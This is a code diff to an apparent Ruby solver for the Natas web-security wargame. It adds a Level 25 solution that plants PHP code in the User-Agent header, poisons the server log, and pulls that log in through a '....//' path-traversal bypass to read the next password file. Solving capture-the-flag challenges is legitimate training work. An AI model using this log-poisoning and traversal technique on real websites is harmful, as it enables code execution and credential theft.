@@ -693,11 +693,31 @@ class NatasLevel24 < NatasLevelBase
     data = get(PAGE).body
     match = %r(Password: (\w{32})</pre>).match(data)
     not_found unless match
-    return found(match[1])
+    found(match[1])
   end
 end
 
 # Level 25
 class NatasLevel25 < NatasLevelBase
   LEVEL = 25
+  PAGE = '/'
+  PAYLOAD = %(Password: <? echo(file_get_contents('#{WEBPASS}/natas26')); ?>)
+
+  def exec
+    response = get(
+      "#{PAGE}?lang=natas_webpass",
+      { 'User-Agent' => PAYLOAD }
+    )
+    cookie = response['Set-Cookie'].split('; ')[0]
+    session_id = cookie.split('=')[1]
+    data = get("#{PAGE}/?lang=....//logs/natas25_#{session_id}.log").body
+    match = /Password: (\w{32})\n/.match(data)
+    not_found unless match
+    found(match[1])
+  end
+end
+
+# Level 26
+class NatasLevel26 < NatasLevelBase
+  LEVEL = 26
 end
